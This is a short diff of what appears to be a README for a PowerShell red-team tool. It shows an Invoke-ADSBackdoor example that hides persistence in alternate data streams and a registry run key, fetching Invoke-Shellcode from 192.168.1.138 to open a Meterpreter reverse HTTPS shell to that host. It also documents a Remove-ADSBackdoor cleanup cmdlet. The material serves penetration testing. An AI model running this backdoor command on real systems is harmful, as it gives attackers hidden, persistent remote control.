@@ -9,3 +9,11 @@ PS C:\Users\test\Desktop> Invoke-ADSBackdoor -URL http://192.168.1.138/Invoke-Sh
  -Lhost 192.168.1.138 -LPort 2222 -Payload windows/meterpreter/reverse_https -Force"
 This will use the function Invoke-Shellcode in Invoke-Shellcode.ps1 to shovel meterpreter back to 192.168.1.138 on port 
 2222 over HTTPS. 
+
+
+The Remove-ADSBackdoor cmdlet will parse the registry run key, extract both ADS locations, remove them
+using Remove-ADS, and will then remove the registry run key.
+
+Example:
+PS C:\Users\test\Desktop> Remove-ADSBackdoor
+
